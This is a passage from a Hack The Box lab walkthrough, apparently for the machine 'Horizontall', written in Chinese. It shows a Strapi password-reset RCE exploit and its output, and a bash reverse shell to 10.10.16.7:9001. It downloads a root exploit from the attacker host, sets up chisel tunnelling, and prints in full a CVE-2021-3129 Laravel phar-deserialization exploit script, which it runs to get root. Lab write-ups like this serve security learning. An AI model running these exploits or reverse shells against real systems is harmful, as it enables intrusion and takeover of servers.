class="built_in">print</span>(out.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == (<span class="string">&quot;__main__&quot;</span>):</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> url.endswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        url = url[:-<span class="number">1</span>]</span><br><span class="line">    check_version()</span><br><span class="line">    password_reset()</span><br><span class="line">    terminal = Terminal()</span><br><span class="line">    terminal.cmdloop()</span><br></pre></td></tr></table></figure>

<p>这是一个组合漏洞，首先会重置用户的密码，虽然我不知道是哪个，看目录像是admin，重置成功后便会生成返回一个JWT Token，然后带着令牌去请求&#x2F;admin&#x2F;plugins&#x2F;install执行cmd，Rember this is a blind RCE don’t expect to see output。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; python3 50239.py http://api-prod.horizontall.htb</span><br><span class="line">[+] Checking Strapi CMS Version running</span><br><span class="line">[+] Seems like the exploit will work!!!</span><br><span class="line">[+] Executing exploit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Password reset was successfully</span><br><span class="line">[+] Your email is: admin@horizontall.htb</span><br><span class="line">[+] Your new credentials are: admin:SuperStrongPassword1</span><br><span class="line">[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjUyNzYzMDk0LCJleHAiOjE2NTUzNTUwOTR9.0WODcG0DqsHwETYjBNYwk9eVrLdIcY1xRV-rbkyDpFQ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$&gt; <span class="built_in">id</span></span><br><span class="line">[+] Triggering Remote code executin</span><br><span class="line">[*] Rember this is a blind RCE don<span class="string">&#x27;t expect to see output</span></span><br><span class="line"><span class="string">&#123;&quot;statusCode&quot;:400,&quot;error&quot;:&quot;Bad Request&quot;,&quot;message&quot;:[&#123;&quot;messages&quot;:[&#123;&quot;id&quot;:&quot;An error occurred&quot;&#125;]&#125;]&#125;</span></span><br><span class="line"><span class="string">$&gt; bash -c &#x27;</span>bash -i &gt;&amp; /dev/tcp/10.10.16.7/9001 0&gt;&amp;1<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[+] Triggering Remote code executin</span></span><br><span class="line"><span class="string">[*] Rember this is a blind RCE don&#x27;</span>t expect to see output</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Reverse-shell："><a href="#Reverse-shell：" class="headerlink" title="Reverse shell："></a>Reverse shell：</h4><p>有对user目录的读取权限：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.10.16.7] from (UNKNOWN) [10.10.11.105] 36446</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1787): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">strapi@horizontall:~/myapi$ </span><br><span class="line">strapi@horizontall:~/myapi$ <span class="built_in">ls</span></span><br><span class="line">api    config      favicon.ico   package.json       public</span><br><span class="line">build  extensions  node_modules  package-lock.json  README.md</span><br><span class="line">strapi@horizontall:~/myapi$ <span class="built_in">ls</span> /home/</span><br><span class="line">developer</span><br><span class="line">strapi@horizontall:~/myapi$ <span class="built_in">cat</span> /home/developer/user.txt </span><br><span class="line">e1...................................</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">strapi@horizontall:/$ find /  -perm /6000 2&gt;/dev/null                 </span><br><span class="line">/sbin/pam_extrausers_chkpwd</span><br><span class="line">/sbin/unix_chkpwd</span><br><span class="line">/usr/bin/mlocate</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/bsd-write</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chage</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/wall</span><br><span class="line">/usr/bin/crontab</span><br><span class="line">/usr/bin/ssh-agent</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/expiry</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/x86_64-linux-gnu/utempter/utempter</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/local/share/fonts</span><br><span class="line">/usr/local/lib/python3.6</span><br><span class="line">/usr/local/lib/python3.6/dist-packages</span><br><span class="line">/usr/local/lib/python2.7</span><br><span class="line">/usr/local/lib/python2.7/dist-packages</span><br><span class="line">/usr/local/lib/python2.7/site-packages</span><br><span class="line">/var/mail</span><br><span class="line">/var/log/journal</span><br><span class="line">/var/log/journal/3cc9504f7ded4867a4c8ca16476b1378</span><br><span class="line">/var/local</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">strapi@horizontall:/$ </span><br></pre></td></tr></table></figure>

<h4 id="CVE-2021-2043："><a href="#CVE-2021-2043：" class="headerlink" title="CVE-2021-2043："></a>CVE-2021-2043：</h4><p>这个漏洞是新漏洞，不能作数：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">strapi@horizontall:~$ wget http://10.10.16.7/CVE-2021-2043.py</span><br><span class="line">--2022-05-17 05:06:37--  http://10.10.16.7/CVE-2021-2043.py</span><br><span class="line">Connecting to 10.10.16.7:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3448 (3.4K) [text/x-python]</span><br><span class="line">Saving to: ‘CVE-2021-2043.py’</span><br><span class="line"></span><br><span class="line">CVE-2021-2043.py    100%[===================&gt;]   3.37K  --.-KB/s    <span class="keyword">in</span> 0.1s    </span><br><span class="line"></span><br><span class="line">2022-05-17 05:06:38 (24.6 KB/s) - ‘CVE-2021-2043.py’ saved [3448/3448]</span><br><span class="line"></span><br><span class="line">strapi@horizontall:~$ <span class="built_in">ls</span></span><br><span class="line">CVE-2021-2043.py  myapi</span><br><span class="line">strapi@horizontall:~$ python3 CVE-2021-2043.py </span><br><span class="line"><span class="comment"># ID</span></span><br><span class="line">sh: 1: ID: not found</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),1001(strapi)</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure>

<h4 id="CVE-2021-3129："><a href="#CVE-2021-3129：" class="headerlink" title="CVE-2021-3129："></a>CVE-2021-3129：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">strapi@horizontall:~$ netstat -ano</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0    144 10.10.11.105:36446      10.10.16.7:9001         ESTABLISHED on (0.34/0/0)</span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)</span><br><span class="line">udp        0      0 10.10.11.105:50522      1.1.1.1:53              ESTABLISHED off (0.00/0/0)</span><br></pre></td></tr></table></figure>

<p>3306应该是个数据库，1337是欢迎页面：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">strapi@horizontall:~$ curl 127.0.0.1:1337</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge,chrome=1&quot;</span> /&gt;</span><br><span class="line">    &lt;title&gt;Welcome to your API&lt;/title&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">    &lt;section&gt;</span><br><span class="line">      &lt;div class=<span class="string">&quot;wrapper&quot;</span>&gt;</span><br><span class="line">        &lt;h1&gt;Welcome.&lt;/h1&gt;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &lt;/section&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">strapi@horizontall:~$ </span><br></pre></td></tr></table></figure>

<p>8000端口会返回很多HTML代码，应该是个HTTP服务，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; ./chisel server -p 9000 --reverse</span><br><span class="line">2022/05/17 13:15:32 server: Reverse tunnelling enabled</span><br><span class="line">2022/05/17 13:15:32 server: Fingerprint QxD29/LAFhRG/uyK4saRO5hEnE3XGwEaGM7N5M5sAf0=</span><br><span class="line">2022/05/17 13:15:32 server: Listening on http://0.0.0.0:9000</span><br><span class="line">2022/05/17 13:20:00 server: session<span class="comment">#1: tun: proxy#R:9002=&gt;localhost:8000: Listening</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">strapi@horizontall:~$ wget http://10.10.16.7/chisel</span><br><span class="line">--2022-05-17 05:15:11--  http://10.10.16.7/chisel</span><br><span class="line">Connecting to 10.10.16.7:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 8077312 (7.7M) [application/octet-stream]</span><br><span class="line">Saving to: ‘chisel’</span><br><span class="line"></span><br><span class="line">chisel              100%[===================&gt;]   7.70M  2.15MB/s    <span class="keyword">in</span> 4.4s    </span><br><span class="line"></span><br><span class="line">2022-05-17 05:15:16 (1.75 MB/s) - ‘chisel’ saved [8077312/8077312]</span><br><span class="line"></span><br><span class="line">strapi@horizontall:~$ ./chisel client 10.10.16.6:9000 R:9002:localhost:8000</span><br><span class="line">bash: ./chisel: Permission denied</span><br><span class="line">strapi@horizontall:~$ <span class="built_in">ls</span></span><br><span class="line">chisel  CVE-2021-2043.py  myapi</span><br><span class="line">strapi@horizontall:~$ <span class="built_in">chmod</span> +x ./chisel </span><br><span class="line">strapi@horizontall:~$ ./chisel client 10.10.16.7:9000 R:9002:localhost:8000</span><br><span class="line">2022/05/17 05:19:57 client: Connecting to ws://10.10.16.7:9000</span><br><span class="line">2022/05/17 05:19:59 client: Connected (Latency 144.170165ms)</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517132208419.png" srcset="/img/loading.gif" lazyload alt="image-20220517132208419"  />

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; searchsploit Laravel    </span><br><span class="line">--------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                             |  Path</span><br><span class="line">--------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Aimeos Laravel ecommerce platform 2021.10 LTS - <span class="string">&#x27;sort&#x27;</span> SQL injection       | php/webapps/50538.txt</span><br><span class="line">Laravel - <span class="string">&#x27;Hash::make()&#x27;</span> Password Truncation Security                      | multiple/remote/39318.txt</span><br><span class="line">Laravel 8.4.2 debug mode - Remote code execution                           | php/webapps/49424.py</span><br><span class="line">Laravel Administrator 4 - Unrestricted File Upload (Authenticated)         | php/webapps/49112.py</span><br><span class="line">Laravel Log Viewer &lt; 0.13.0 - Local File Download                          | php/webapps/44343.py</span><br><span class="line">Laravel Nova 3.7.0 - <span class="string">&#x27;range&#x27;</span> DoS                                           | php/webapps/49198.txt</span><br><span class="line">Laravel Valet 2.0.3 - Local Privilege Escalation (macOS)                   | macos/local/50591.py</span><br><span class="line">PHP Laravel 8.70.1 - Cross Site Scripting (XSS) to Cross Site Request Forg | php/webapps/50525.txt</span><br><span class="line">PHP Laravel Framework 5.5.40 / 5.6.x &lt; 5.6.30 - token Unserialize Remote C | linux/remote/47129.rb</span><br><span class="line">UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read                  | php/webapps/48166.txt</span><br><span class="line">UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload         | php/webapps/46389.py</span><br><span class="line">--------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>

<p>searchsploit脚本不是很好用，目标并没有与之相符的日志路径，不过我又找到了以下脚本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/nth347/CVE-2021-3129_exploit/blob/master/exploit.py</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Send a post request with a specific viewFile value, returning HTTP response</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">url=<span class="string">&#x27;&#x27;</span>, viewfile=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="line">        <span class="string">&quot;parameters&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;variableName&quot;</span>: <span class="string">&quot;whateverYouWant&quot;</span>,</span><br><span class="line">            <span class="string">&quot;viewFile&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    data[<span class="string">&#x27;parameters&#x27;</span>][<span class="string">&#x27;viewFile&#x27;</span>] = viewfile</span><br><span class="line">    resp = requests.post(url, json=data, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate payload and return it as text</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">chain=<span class="string">&#x27;&#x27;</span>, command=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="comment"># Ensure that we have PHPGGC in current directory, if not we&#x27;ll clone it</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(<span class="string">&quot;phpggc&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] PHPGGC found. Generating payload and deploy it to the target&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[i] PHPGGC not found. Cloning it&quot;</span>)</span><br><span class="line">        os.system(<span class="string">&quot;git clone https://github.com/ambionics/phpggc.git&quot;</span>)</span><br><span class="line">    payload = subprocess.getoutput(</span><br><span class="line">        <span class="string">r&quot;php -d&#x27;phar.readonly=0&#x27; ./phpggc/phpggc &#x27;%s&#x27; system &#x27;%s&#x27; --phar phar -o php://output | base64 -w0 | &quot;</span></span><br><span class="line">        <span class="string">r&quot;sed -E &#x27;s/./\0=00/g; s/==/=3D=/g; s/$/=00/g&#x27;&quot;</span> % (chain, command))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Clear logs,</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[i] Trying to clear logs&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> (send(url,</span><br><span class="line">                <span class="string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf&quot;</span></span><br><span class="line">                <span class="string">&quot;-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>).status_code != <span class="number">200</span>):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Logs cleared&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage:   %s &lt;URL&gt; &lt;CHAIN&gt; &lt;CMD&gt;&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Example: %s http(s)://localhost:8000 Monolog/RCE1 whoami&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;I recommend to use Monolog/RCE1 or Monolog/RCE2 as CHAIN&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line">    url = sys.argv[<span class="number">1</span>] + <span class="string">&quot;/_ignition/execute-solution&quot;</span></span><br><span class="line">    chain = sys.argv[<span class="number">2</span>]</span><br><span class="line">    command = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 1. Clear logs, write the first log entry</span></span><br><span class="line">    clear(url)</span><br><span class="line">    send(url, <span class="string">&quot;AA&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 3. Write the second log entry with encoded PHAR payload</span></span><br><span class="line">    send(url, generate(chain, command))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 4. Convert log file to a valid PHAR</span></span><br><span class="line">    <span class="keyword">if</span> (send(url,</span><br><span class="line">             <span class="string">&quot;php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64&quot;</span></span><br><span class="line">             <span class="string">&quot;-decode/resource=../storage/logs/laravel.log&quot;</span>).status_code == <span class="number">200</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Successfully converted logs to PHAR&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Fail to convert logs to PHAR&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Step 5. Trigger PHAR deserialization, extract the output</span></span><br><span class="line">    response = send(url, <span class="string">&quot;phar://../storage/logs/laravel.log&quot;</span>)</span><br><span class="line">    result = re.sub(<span class="string">&quot;&#123;[\s\S]*&#125;&quot;</span>, <span class="string">&quot;&quot;</span>, response.text)</span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] PHAR deserialized. Exploited\n&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[i] There is no output&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Clear logs</span></span><br><span class="line">    clear(url)</span><br></pre></td></tr></table></figure>

<p>利用phpggc生成对应的phar文件→清空laravel.log → 将编码后的字符写入到log中→清除干扰字符→执行phar反序列化.phar反序列化就是可以在<strong>不使用php函数unserialize ()的前提下，进行反序列化，从而引起的严重的php对象注入漏洞</strong>。这个洞很奇怪，在目标机器上是复现不了的，但是端口转发到本地却可以，可能是目标不出网，无法git clone <a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc.git%E5%90%A7%EF%BC%9A">https://github.com/ambionics/phpggc.git吧：</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; python3 ./CVE-2021-3129.py http://localhost:9003 Monolog/RCE1 <span class="built_in">id</span></span><br><span class="line">[i] Trying to clear logs</span><br><span class="line">[+] Logs cleared</span><br><span class="line">[+] PHPGGC found. Generating payload and deploy it to the target</span><br><span class="line">[+] Successfully converted logs to PHAR</span><br><span class="line">[+] PHAR deserialized. Exploited</span><br><span class="line"></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"></span><br><span class="line">[i] Trying to clear logs</span><br><span class="line">[+] Logs cleared</span><br></pre></td></tr></table></figure>

<p>弹shell也很怪，以往正常情况是弹不回来的，指定一个端口进行输入命令，还需要指定一个端口监听回显：</p>
<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517135837450.png" srcset="/img/loading.gif" lazyload alt="image-20220517135837450"></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>HTB Walkthrough - Horizontall</div>
      <div>https://crazyinside.github.io/post/HackTheBox-Horizontall.html</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>Author</div>
          <div>World'sEnd</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>Posted on</div>
          <div>August 14, 2023</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>Licensed under</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
